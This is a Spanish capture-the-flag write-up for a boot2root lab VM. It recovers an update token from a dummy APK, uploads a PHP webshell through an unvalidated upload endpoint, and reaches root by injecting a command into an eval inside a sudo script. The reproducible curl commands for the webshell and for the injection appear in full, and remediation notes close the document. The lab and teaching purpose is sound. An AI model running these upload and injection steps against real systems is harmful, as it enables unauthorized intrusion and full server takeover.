# Desafío 12 — Señal Fantasma (XimaTV / CentinelaOTA)

| Campo | Valor |
|---|---|
| Categoría | Boot2Root / pentest de infraestructura (web + privesc) |
| Dificultad | media |
| Puntos | — |
| Estado | ✅ resuelto |
| Flag USER | `flag{ejemplo}` |
| Flag ROOT | `flag{ejemplo}` |

## Enunciado

> En los barrios donde la televisión legal no llega, la cajita pirata era la ventana al mundo […]
> Seguiste el rastro de esa señal hasta el otro extremo del cable: el servidor que la gobierna, el que
> reparte las actualizaciones a toda la flota de cajas. Entra, llega hasta el fondo del sistema y apaga
> la señal fantasma de una vez.
>
> Hipervisor recomendado: VirtualBox 7.x (también compatible con VMware). Red: una sola interfaz en host-only.
> Se requieren dos banderas: USER y ROOT.

## Reconocimiento

### Aprovisionamiento de la VM (OVA → VMware)

El equipo no tiene VirtualBox; sí **VMware Workstation 17** (`vmrun` 1.17, build 17966106).

1. Integridad: `Get-FileHash -Algorithm SHA256 SenalFantasma.ova` →
   `2c18dd289dbeaf7b7a2f1e61d4d590fe9a863fb76cfdf4345a8f5495ef59aeed` (**coincide** con `SHA256SUMS.txt`).
2. Contenido de la OVA (`tar -tvf`): `SenalFantasma.ovf`, `SenalFantasma-disk001.vmdk`
   (761.127.936 B, `streamOptimized`), `SenalFantasma.mf`.
3. Extracción a `C:\CTF_VMs\SenalFantasma\` y conversión del disco:
   `vmware-vdiskmanager -r SenalFantasma-disk001.vmdk -t 0 SenalFantasma.vmdk` → disco monolítico de 2,37 GB.
4. `.vmx` creado a mano con los datos del OVF: Ubuntu 64-bit, 2 vCPU, 2048 MB, disco en **LSILogic**,
   NIC **e1000** en `hostonly` / `VMnet1` (192.168.159.0/24).
   - Primer intento con `virtualHW.version = "19"` falló: *«hardware version not supported»* →
     corregido a **18**, que es el máximo de esta versión de Workstation.
5. Arranque headless: `vmrun -T ws start SenalFantasma.vmx nogui`.
6. DHCP de VMware (`C:\ProgramData\VMware\vmnetdhcp.leases`) entregó:
   **192.168.159.128**, hostname `senalfantasma`, MAC `00:0c:29:45:9f:cf`.

### Acceso desde el entorno de análisis

Kali (WSL2, modo mirrored) **no ve** la red host-only de VMware (solo replica adaptadores físicos), por lo que
se levantó un **pivote SOCKS5** en el host Windows (`solucion/socks5_pivot.py`, `127.0.0.1:1080`). Con eso el
toolkit de Kali alcanza 192.168.159.0/24 vía `proxychains4`. Para las pruebas de este reto bastó con la shell
web (HTTP) y utilidades nativas de Windows (`curl.exe`).

### Puertos

Escaneo TCP completo (`solucion/scan_tcp.py`, connect scan con 400 hilos):

```
22/tcp  ssh   OpenSSH
80/tcp  http  Apache/2.4.58 (Ubuntu)
```

## Análisis

### Sitio web (http://192.168.159.128/)

Landing falsa de **XimaTV** (IPTV pirata): ofrece `download/xima-tv.apk` y anuncia el panel de
distribución/OTA en `/MarketServer/`. El header `Server` del panel es `CentinelaOTA/2.3`.

```
GET /MarketServer/            -> XML: endpoints /MarketServer/update y /MarketServer/ota.php,
                                 nota: "OTA push restringido a distribuidores (token)"
GET /MarketServer/update      -> 404
GET /MarketServer/ota.php     -> 403 <error>missing or invalid X-OTA-Token</error>
```

### APK sintético → token OTA

`xima-tv.apk` pesa solo 929 B: ZIP con `AndroidManifest.xml` (25 B), `classes.dex` (111 B),
`resources.arsc`, `META-INF/MANIFEST.MF` y **`assets/c2.conf`**. El dex solo contiene
`Lcom/xima/iptv/net/OtaClient;`, `postUpdate`, `X-OTA-Token`, `/MarketServer/ota.php`.

`assets/c2.conf` está en Base64 (252 B) y decodifica a la configuración del cliente C2/OTA:

```
# XimaTV OTA client config (flota Centinela)
ota_host=auto
ota_endpoint=/MarketServer/ota.php
ota_field=pkg
ota_token=fl0t4_0ta_s3cr3t_2026
notice=/notice/api/get_notice
dga_seed=0xC0FFEE
```

Con `X-OTA-Token: fl0t4_0ta_s3cr3t_2026`, `ota.php` responde:

```
<ApkInfo><status>ready</status><hint>POST multipart, campo 'pkg'</hint></ApkInfo>
```

### Subida sin restricciones → RCE (www-data)

El código de `/MarketServer/ota.php` (leído luego de obtener shell) confirma el fallo:

```php
$name = basename($_FILES['pkg']['name']);
$dest = __DIR__ . '/../ota/' . $name;
if (move_uploaded_file($_FILES['pkg']['tmp_name'], $dest)) { ... }
```

No valida extensión, MIME ni contenido: basta subir un `.php` y ejecutarlo desde `/ota/`.
Con `curl -F "pkg=@sh.php" -H "X-OTA-Token: ..."` el archivo queda en
`/var/www/html/ota/sh.php` y responde a `cmd=...` con `shell_exec` (usuario `www-data`).

### Flag USER

`/home/<usuario>/user.txt` es legible (644):

```
flag{ejemplo}
```

### Escalada a ROOT

`sudo -n -l` para `www-data`:

```
(root) NOPASSWD: /usr/local/sbin/ota-deploy
```

Script vulnerable (`/usr/local/sbin/ota-deploy`, root:root 755):

```bash
PKG="$1"
/usr/bin/logger -t ota-deploy "deploy solicitado: $PKG"
eval "sha256sum /var/www/html/ota/$PKG 2>/dev/null"
```

El argumento se interpola **sin sanear dentro de `eval`**, por lo que un `;` rompe el comando y ejecuta
lo que siga como root (no hace falta que el archivo exista):

```
sudo -n /usr/local/sbin/ota-deploy 'x;id'
# uid=0(root) gid=0(root) groups=0(root)

sudo -n /usr/local/sbin/ota-deploy 'x;cat /root/root.txt'
```

### Flag ROOT

```
flag{ejemplo}
```

## Solución (pasos reproducibles)

```bash
# 0) VM ya desplegada en 192.168.159.128 (host-only). Token desde el APK:
python - <<'EOF'
import base64, zipfile, io
print(base64.b64decode(zipfile.ZipFile('xima-tv.apk').read('assets/c2.conf')).decode())
EOF

# 1) Subir webshell (sin validación de extensión)
curl -H "X-OTA-Token: fl0t4_0ta_s3cr3t_2026" \
     -F "pkg=@sh.php" http://192.168.159.128/MarketServer/ota.php
# <ApkInfo><status>stored</status><path>/ota/sh.php</path></ApkInfo>

# 2) Ejecución de comandos como www-data
curl -s --data-urlencode "cmd=id" http://192.168.159.128/ota/sh.php

# 3) USER
curl -s --data-urlencode "cmd=cat /home/<usuario>/user.txt" http://192.168.159.128/ota/sh.php

# 4) ROOT (inyección en eval de ota-deploy vía sudo NOPASSWD)
curl -s --data-urlencode "cmd=sudo -n /usr/local/sbin/ota-deploy 'x;cat /root/root.txt'" \
     http://192.168.159.128/ota/sh.php
```

Automatización completa: `solucion/exploit.py` (token → upload → user → root).

## Flags

```
USER: flag{ejemplo}
ROOT: flag{ejemplo}
```

## Evidencia y artefactos

| Ruta | Contenido |
|---|---|
| `flag_user.txt` / `flag_root.txt` | Banderas capturadas |
| `work/xima-tv.apk` | APK entregado por la web (929 B) |
| `work/apk_raw/` | Contenido extraído del APK |
| `work/c2.conf.decoded.txt` | Configuración OTA decodificada (token) |
| `work/sh.php` | Webshell subida al servidor (`/var/www/html/ota/sh.php`) |
| `solucion/exploit.py` | Exploit end-to-end del reto |
| `solucion/webcmd.py` | Cliente de la webshell |
| `solucion/scan_tcp.py` | Escáner TCP connect usado desde Windows |
| `solucion/socks5_pivot.py` | Pivote SOCKS5 host → red host-only (Kali/WSL) |

VM de trabajo: `C:\CTF_VMs\SenalFantasma\` (OVA extraída + `SenalFantasma.vmdk` convertido + `SenalFantasma.vmx`).
Arranque: `vmrun -T ws start C:\CTF_VMs\SenalFantasma\SenalFantasma.vmx nogui`.

## Lecciones / notas

- **APK como fuente de secretos**: un asset Base64 en un APK "de mentira" entregó el token OTA; los tokens
  embebidos en el cliente son públicos por definición.
- **Upload sin validación**: `basename()` solo evita traversal de directorios, no ejecución; validar extensión,
  MIME y contenido, y servir el directorio de subidas sin handler PHP.
- **`eval` con entrada del usuario** en un script con `sudo NOPASSWD`: patrón clásico de escalada trivial;
  usar `sha256sum -- "$archivo"` sin `eval` y validar el nombre (allowlist).
- **Entorno**: cuando WSL (mirrored) no alcanza una red host-only de VMware, un SOCKS5 mínimo en el host
  resuelve el pivote sin tocar la configuración del hipervisor.
- Nota de limpieza: además de `sh.php`, quedaron `/ota/test.txt` y `/ota/test.php` (pruebas de subida).
  La VM es desechable; las copias locales están en `work/`.

## Backups

| Archivo | Backup |
|---|---|
| `ctf/CONTEXTO_CTF.md` (índice) | `ctf/backups/CONTEXTO_CTF.md.20261023-182817` |
